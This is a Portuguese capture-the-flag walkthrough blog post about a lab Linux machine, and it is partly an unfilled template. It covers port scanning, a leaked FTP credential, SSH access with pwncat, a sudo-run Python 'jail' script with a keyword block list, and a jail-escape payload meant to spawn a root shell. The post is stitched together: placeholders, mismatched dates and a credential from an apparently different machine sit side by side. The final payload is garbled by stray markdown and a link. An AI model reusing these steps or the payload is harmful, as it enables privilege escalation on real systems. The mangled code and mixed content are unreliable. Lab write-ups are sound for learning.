---
title: Plataforma - Nome Modelo
author: mithr4nd1r
date: 2022-11-29 00:00:00 -0300
categories: [Walkthrough, Plataforma]
tags: [writeup, walkthrough, tryhackme, thm, tutorial, hacking, pentest, ctf, capture, flag, linux, medium, médio]
mermaid: true
image: https://pm1.narvii.com/6423/6ceaa4749eeb98d7ac41c7b1eead16646c7857be_00.jpg
    w: 155
    h: 126
pin: true
---

Dificuldade | Opinião | 📅 Início | 📅 Conclusão
:--:|:--:|:--:|:--:
![](/assets/img/nivel/button_facil.png) | ![](/assets/img/nivel/button_medio.png) | 16 de Dezembro de 2022 | 16 de Dezembro de 2022


## Escaneamento

Iniciamos nosso escaneamento como sempre, varrendo todas as portas, verificando as versões e realizando alguns testes rápidos de scripts.
- Comando: `nmap -sSV -A -v -Pn -p- --min-rate=10000 10.10.208.57`

```console
{nmap scan}
```

## Enumeração

Partindo para enumeração verificamos o serviço ....
### FTP (21) - Versão: vsftpd 3.0.3

- Comando: `ftp 10.10.208.57`
```console
{resultado do comando}
```

Encontramos credenciais que podem ser úteis:
> `backup@spookysec.local`:`backup2517860`
{: .prompt-info }

Podemos observar que ... então a partir desse dado encontramos o ponto de entrada


## Exploração (Acesso Inicial)

Para conseguir o acesso inicial seguimos na linha de raciocínio de utilizar tal exploit em tal serviço..

- Comando: `pwncat-cs ssh://kamishiro@10.10.208.57`
```console
01:55:24 root@m1thr4d1r tokyoghoul → pwncat-cs ssh://kamishiro@10.10.208.57
/root/.local/pipx/venvs/pwncat-cs/lib/python3.10/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[13:56:45] Welcome to pwncat 🐈!                                        __main__.py:164
Password: ***********
[13:57:16] 10.10.208.57:22: registered new host w/ db                    manager.py:957
(local) pwncat$                                                                        
(remote) kamishiro@vagrant:/home/kamishiro$ id
uid=1001(kamishiro) gid=1001(kamishiro) groups=1001(kamishiro)
```

## Pós-Exploração (Escaneamento Interno)

Com o acesso interno realiza-se uma enumeração interna utilizando ...
- Comando: `sudo -l`
```console
    [sudo] password for kamishiro: 
    Matching Defaults entries for kamishiro on vagrant.vm:
        env_reset, exempt_group=sudo, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User kamishiro may run the following commands on vagrant.vm:
        (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```


```python
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

## Escalação de Privilégio

Sabemos que temos de alguma forma bypassar a restrição de palavras do script para escalar privilégio, assim pesquisei no google por "python jail escape" e encontrei uma possível solução...
[Escaping Python Jails](https://anee.me/escaping-python-jails-849c65cf306e)

- Comandos: `sudo /usr/bin/python3 /home/kamishiro/jail.py`

```python
**__builtins__**.__**dict__**['__**IMPORT__**'.lower()](https://www.notion.so/'OS'.lower()).__**dict__**['SYSTEM'.lower()]('/bin/bash -p')
```

![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/tokyoghoul/Untitled9.png)